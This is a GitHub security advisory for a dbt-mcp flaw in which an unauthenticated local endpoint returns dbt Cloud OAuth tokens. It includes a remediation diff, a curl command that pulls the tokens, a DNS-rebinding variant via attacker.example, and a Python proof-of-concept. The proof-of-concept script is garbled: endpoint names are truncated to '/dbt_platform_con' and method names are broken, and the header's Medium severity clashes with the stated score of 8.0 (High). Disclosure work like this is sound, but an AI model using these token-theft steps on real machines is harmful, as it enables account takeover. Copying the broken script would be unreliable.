# [M] dbt MCP Server: Unauthenticated OAuth Context Endpoint Leaks dbt Platform Tokens

## Summary
Severity: Medium
Advisory: GHSA-jr33-mw75-7j8f
CVE: CVE-2026-55837
CWE: CWE-200, CWE-306, CWE-346
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-jr33-mw75-7j8f
Type: github-advisory

## Affected
- PyPI: `dbt-mcp` — affected >=0 <1.20.0

## Details
## Unauthenticated OAuth Context Endpoint Leaks dbt Platform Tokens

### Summary

The local OAuth helper FastAPI server bundled with `dbt-mcp` exposes the `GET /dbt_platform_context` endpoint without any form of authentication or host-origin validation. After a user completes the OAuth login flow against dbt Cloud (cloud.getdbt.com), the endpoint returns the full `DbtPlatformContext` object — including the victim's `access_token` and `refresh_token` for the dbt Platform API — verbatim to any caller that can reach `127.0.0.1:6785`. An attacker who can direct the victim's browser to the helper origin via DNS rebinding, or who has co-located process access on the same host, can silently exfiltrate both tokens. The stolen bearer token grants full dbt Cloud API access as the victim; the refresh token enables persistent access beyond the original token's expiry. **CVSS Base Score: 8.0 (High).**

### Details

During the OAuth login flow, `dbt-mcp` launches an embedded FastAPI server (the "OAuth helper") bound to `127.0.0.1` starting on port `6785` (configured at `src/dbt_mcp/config/credentials.py:34`, `OAUTH_REDIRECT_STARTING_PORT = 6785`). After the OAuth callback is handled, the helper persists the full token context to disk and continues serving requests.

**Data flow from source to sink:**

1. **Source** — `src/dbt_mcp/oauth/fastapi_app.py:106`: The OAuth callback receives `token_response` from the dbt Platform authorization server.
2. `src/dbt_mcp/oauth/dbt_platform.py:60`: `AccessTokenResponse(**token_response)` stores `access_token` and `refresh_token` as plaintext fields.
3. `src/dbt_mcp/oauth/dbt_platform.py:64–69`: The `AccessTokenResponse` is embedded inside `DecodedAccessToken`, which is in turn embedded inside `DbtPlatformContext`.
4. `src/dbt_mcp/oauth/fastapi_app.py:114`: The fully token-bearing `DbtPlatformContext` object is passed to `context_manager` for persistence.
5. **Persistence sink** — `src/dbt_mcp/oauth/context_manager.py:63–64`: `yaml.dump(context.model_dump())` serializes the entire model — including tokens — to a YAML file on disk.
6. **HTTP sink** — `src/dbt_mcp/oauth/fastapi_app.py:162–165`: The `GET /dbt_platform_context` route reads the YAML file back and returns the raw `DbtPlatformContext` object with no redaction.

```python
# src/dbt_mcp/oauth/fastapi_app.py:162-165
@app.get("/dbt_platform_context")
def get_dbt_platform_context() -> DbtPlatformContext:
    logger.info("Selected project received")
    return dbt_platform_context_manager.read_context() or DbtPlatformContext()
```

```python
# src/dbt_mcp/oauth/dbt_platform.py:8-14
class AccessTokenResponse(BaseModel):
    access_token: str
    refresh_token: str
    ...

class DbtPlatformContext(BaseModel):
    decoded_access_token: DecodedAccessToken | None = None
    ...
```

**Missing protections (confirmed by grep):**

- No `TrustedHostMiddleware` — the server accepts requests with arbitrary `Host` headers, enabling DNS rebinding.
- No `CORSMiddleware` — no cross-origin restrictions on which sites can read the response.
- No CSRF protection, no session nonce, no `Origin` header validation.
- The route has no FastAPI `Depends()` security dependency.

A `grep -Rni "TrustedHostMiddleware\|CORSMiddleware\|csrf\|origin"` across the OAuth FastAPI application returns no results.

**Recommended remediation:**

```diff
--- a/src/dbt_mcp/oauth/fastapi_app.py
+++ b/src/dbt_mcp/oauth/fastapi_app.py
+from starlette.middleware.trustedhost import TrustedHostMiddleware
+
+def _redact_context(context: DbtPlatformContext | None) -> DbtPlatformContext:
+    if context is None:
+        return DbtPlatformContext()
+    return context.model_copy(update={"decoded_access_token": None})

     app = FastAPI()
+    app.add_middleware(
+        TrustedHostMiddleware,
+        allowed_hosts=["localhost", "127.0.0.1"],
+    )

     @app.get("/dbt_platform_context")
     def get_dbt_platform_context() -> DbtPlatformContext:
         logger.info("Selected project received")
-        return dbt_platform_context_manager.read_context() or DbtPlatformContext()
+        return _redact_context(dbt_platform_context_manager.read_context())
```

### PoC

**Prerequisites:**

- `dbt-mcp` v1.19.1 installed in a Python 3.12 environment.
- The following runtime dependencies available: `authlib~=1.6.7`, `fastapi~=0.128.0`, `uvicorn~=0.38.0`, `pyyaml~=6.0.2`, `httpx~=0.28.1`, `starlette~=0.50.0`, `pydantic~=2.0`, `pydantic-settings~=2.10.1`.
- No `DBT_TOKEN` set (OAuth flow mode active).

**Step 1 — Build the Docker test environment:**

```bash
docker build -t vuln001-dbt-mcp -f vuln-001/Dockerfile .
```

The `Dockerfile` installs only the OAuth helper's runtime dependencies and copies `src/` and `poc.py`:

```dockerfile
FROM python:3.12-slim
WORKDIR /app
RUN pip install --no-cache-dir \
    "authlib~=1.6.7" "fastapi~=0.128.0" "uvicorn~=0.38.0" \
    "pyjwt~=2.12.0" "pyyaml~=6.0.2" "httpx~=0.28.1" \
    "filelock~=3.20.3" "starlette~=0.50.0" "requests>=2.28" \
    "pydantic~=2.0" "pydantic-settings~=2.10.1"
COPY repo/src /app/src
ENV PYTHONPATH=/app/src
COPY vuln-001/poc.py /app/poc.py
CMD ["python3", "/app/poc.py"]
```

**Step 2 — Run the PoC:**

```bash
docker run --rm --network=host vuln001-dbt-mcp
```

The PoC script (`poc.py`) performs the following automatically:

1. Writes a realistic fake OAuth context YAML to `/tmp/dbt_poc_mcp.yml`, simulating a victim who has already completed the OAuth login flow.
2. Instantiates the **real** `create_app()` from `src/dbt_mcp/oauth/fastapi_app.py` using `DbtPlatformContextManager` backed by the pre-seeded file.
3. Starts the server on `127.0.0.1:16785` in a background thread.
4. Issues an unauthenticated `GET /dbt_platform_context` with no `Authorization` header.
5. Asserts that `access_token` and `refresh_token` are returned verbatim.

**Equivalent manual curl (against the live OAuth helper during actual OAuth flow):**

```bash
# While the victim is running the OAuth login flow:
export DBT_HOST='cloud.getdbt.com'
unset DBT_TOKEN
dbt-mcp   # OAuth helper starts on 127.0.0.1:6785

# From any co-located process (or a DNS-rebinding browser page):
curl -s 'http://127.0.0.1:6785/dbt_platform_context' \
  | jq '.decoded_access_token.access_token_response'
```

**Expected output (Phase 2 observed):**

```
[*] HTTP Status: 200
[*] Full response JSON:
{
  "decoded_access_token": {
    "access_token_response": {
      "access_token": "eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER",
      "refresh_token": "dbt-platform-offline-refresh-SUPERSECRET-abc123",
      "expires_in": 3600,
      "scope": "user_access offline_access",
      "token_type": "Bearer",
      "expires_at": 9999999999
    },
    ...
  },
  ...
}
[!] LEAKED access_token  : eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER
[!] LEAKED refresh_token : dbt-platform-offline-refresh-SUPERSECRET-abc123
[+] VULNERABILITY CONFIRMED: Tokens returned from /dbt_platform_context WITHOUT authentication!
```

**DNS rebinding variant:**

A malicious website can resolve `attacker.example` to `127.0.0.1` after the browser's DNS TTL expires ("DNS rebinding"). Because the helper accepts any `Host` header, the browser treats `http://attacker.example:6785` as same-origin and fetches `/dbt_platform_context` via JavaScript `fetch()`, obtaining the full token JSON across the network without any local access.

### Impact

Any local process running as any user on the same host, or a remote attacker who exploits DNS rebinding against a victim's browser during or after the OAuth login session, can retrieve the victim's full dbt Cloud OAuth tokens with a single unauthenticated HTTP GET request. The `access_token` grants immediate bearer-token access to the dbt Cloud REST and GraphQL APIs on behalf of the victim. The `refresh_token` (with `offline_access` scope) allows the attacker to obtain new access tokens after the original expires, providing persistent unauthorized access until the victim manually revokes the OAuth grant. An attacker with these tokens can read or modify dbt projects, run jobs, access environment secrets, and exfiltrate data lineage and warehouse credentials stored in dbt Cloud.

This vulnerability is a **Missing Authentication for Critical Function** (CWE-306). Any developer machine running `dbt-mcp` with OAuth-mode authentication is affected for the duration of the OAuth helper process lifetime. Because `dbt-mcp` is a developer tool, the primary victims are individual developers and their associated dbt Cloud organization accounts.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim

WORKDIR /app

# Install minimal runtime dependencies (no heavy dbt-protos/dbt-sl-sdk needed
# because fastapi_app.py's import chain doesn't touch them)
RUN pip install --no-cache-dir \
 "authlib~=1.6.7" \
 "fastapi~=0.128.0" \
 "uvicorn~=0.38.0" \
 "pyjwt~=2.12.0" \
 "pyyaml~=6.0.2" \
 "httpx~=0.28.1" \
 "filelock~=3.20.3" \
 "starlette~=0.50.0" \
 "requests>=2.28" \
 "pydantic~=2.0" \
 "pydantic-settings~=2.10.1"

# Copy only the source tree needed for the OAuth server
COPY repo/src /app/src

ENV PYTHONPATH=/app/src

COPY vuln-001/poc.py /app/poc.py

CMD ["python3", "/app/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: Unauthenticated OAuth Con Endpoint Leaks dbt Platform Tokens

Attack scenario:
 - dbt-mcp runs a local FastAPI OAuth helper on 127.0.0.1:6785 during login.
 - After the OAuth flow completes, tokens are persisted to ~/.dbt/mcp.yml.
 - GET /dbt_platform_con is accessible with NO authentication at all.
 - Any process on the same host (or a DNS-rebinding browser page) can call it
 and receive the full access_token + refresh_token.

This PoC:
 1. Pre-seeds a con file with fake-but-realistic OAuth tokens
 (simulating a victim who has already completed the OAuth flow).
 2. Starts the real vulnerable FastAPI app from src/dbt_mcp/oauth/fastapi_app.py.
 3. Issues an unauthenticated HTTP GET /dbt_platform_con (no auth header).
 4. Confirms the tokens are returned verbatim.
"""

import asyncio
import json
import os
import sys
import tempfile
import threading
import time
from pathlib import Path

import httpx
import uvicorn
import yaml

# Fake tokens that simulate a victim's completed OAuth session.
FAKE_ACCESS_TOKEN = "eyJhbGciOiJSUzI1NiJ9.VICTIM_ACCESS_TOKEN_PLACEHOLDER"
FAKE_REFRESH_TOKEN = "dbt-platform-offline-refresh-SUPERSECRET-abc123"

FAKE_CONTEXT = {
 "decoded_access_token": {
 "access_token_response": {
 "access_token": FAKE_ACCESS_TOKEN,
 "refresh_token": FAKE_REFRESH_TOKEN,
 "expires_in": 3600,
 "scope": "user_access offline_access",
 "token_type": "Bearer",
 "expires_at": 9999999999,
 },
 "decoded_claims": {
 "sub": "99999",
 "iat": 1700000000,
 "exp": 9999999999,
 },
 },
 "host_prefix": "victimco",
 "dbt_host": "cloud.getdbt.com",
 "account_id": 42,
 "selected_project_ids": None,
 "dev_environment": None,
 "prod_environment": None,
}

PORT = 16785


def start_server(context_file: Path, static_dir: str) -> None:
 """Run the actual vulnerable FastAPI app in a background thread."""
 from authlib.integrations.requests_client import OAuth2Session
 from dbt_mcp.oauth.context_manager import DbtPlatformContextManager
 from dbt_mcp.oauth.fastapi_app import create_app

 context_manager = DbtPlatformContextManager(context_file)

 # A dummy OAuth client — only used by the /oauth-callback route,
 # which this PoC never triggers.
 fake_oauth_client = OAuth2Session(client_id="poc-dummy-client")

 app = create_app(
 oauth_client=fake_oauth_client,
 state_to_verifier={},
 dbt_platform_url="https://cloud.getdbt.com",
 static_dir=static_dir,
 dbt_platform_context_manager=context_manager,
 )

 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 config = uvicorn.Config(
 app=app, host="127.0.0.1", port=PORT, log_level="error", loop="asyncio"
 )
 server = uvicorn.Server(config)
 loop.run_until_complete(server.serve())


def wait_for_server(port: int, timeout: float = 15.0) -> bool:
 import socket

 deadline = time.time() + timeout
 while time.time() < deadline:
 try:
 with socket.create_connection(("127.0.0.1", port), timeout=1):
 return True
 except OSError:
 time.sleep(0.2)
 return False


def main() -> int:
 print("[*] VULN-001 PoC — Unauthenticated /dbt_platform_con token leak")
 print("=" * 70)

 # 1. Pre-seed con file (victim has completed OAuth; tokens are on disk)
 context_file = Path("/tmp/dbt_poc_mcp.yml")
 context_file.write_(
 yaml.dump(FAKE_CONTEXT, default_flow_style=False), encoding="utf-8"
 )
 print(f"[*] Con file written: {context_file}")
 print(f" access_token : {FAKE_ACCESS_TOKEN}")
 print(f" refresh_token : {FAKE_REFRESH_TOKEN}")

 # 2. Minimal static dir so NoCacheStaticFiles mount doesn't error on startup
 static_dir = tempfile.mkdtemp(prefix="dbt_poc_static_")
 (Path(static_dir) / "index.html").write_("<html>dbt OAuth</html>")

 # 3. Start the real vulnerable FastAPI server in a background thread
 t = threading.Thread(
 target=start_server, args=(context_file, static_dir), daemon=True
 )
 t.start()

 print(f"\n[*] Waiting for FastAPI server to start on 127.0.0.1:{PORT} ...")
 if not wait_for_server(PORT):
 print("[-] FAIL: Server did not start within timeout.")
 return 2

 print("[*] Server is up.")

 # 4. Send unauthenticated GET /dbt_platform_con (no Authorization header)
 url = f"http://127.0.0.1:{PORT}/dbt_platform_con"
 print(f"\n[*] Sending unauthenticated GET {url}")
 try:
 resp = httpx.get(url, timeout=10)
 except Exception as exc:
 print(f"[-] HTTP request failed: {exc}")
 return 2

 print(f"[*] HTTP Status: {resp.status_code}")

 if resp.status_code != 200:
 print(f"[-] FAIL: Expected 200, got {resp.status_code}")
 print(f" Body: {resp.[:500]}")
 return 1

 try:
 data = resp.json()
 except Exception as exc:
 print(f"[-] FAIL: Response is not JSON: {exc}\n Body: {resp.[:500]}")
 return 1

 print(f"\n[*] Full response JSON:\n{json.dumps(data, indent=2)}")

 # 5. Verify that the tokens are in the response (no redaction, no auth required)
 try:
 leaked_access = (
 data["decoded_access_token"]["access_token_response"]["access_token"]
 )
 leaked_refresh = (
 data["decoded_access_token"]["access_token_response"]["refresh_token"]
 )
 except (KeyError, TypeError) as exc:
 print(f"\n[-] FAIL: Token fields missing from response: {exc}")
 return 1

 print(f"\n[!] LEAKED access_token : {leaked_access}")
 print(f"[!] LEAKED refresh_token : {leaked_refresh}")

 if leaked_access == FAKE_ACCESS_TOKEN and leaked_refresh == FAKE_REFRESH_TOKEN:
 print(
 "\n[+] VULNERABILITY CONFIRMED:"
 " Tokens returned from /dbt_platform_con WITHOUT authentication!"
 )
 return 0
 else:
 print("\n[-] FAIL: Returned tokens do not match expected values.")
 print(f" Expected access_token : {FAKE_ACCESS_TOKEN}")
 print(f" Got access_token : {leaked_access}")
 return 1


if __name__ == "__main__":
 sys.exit(main())
```

## References
- https://github.com/dbt-labs/dbt-mcp/security/advisories/GHSA-jr33-mw75-7j8f
- https://github.com/dbt-labs/dbt-mcp
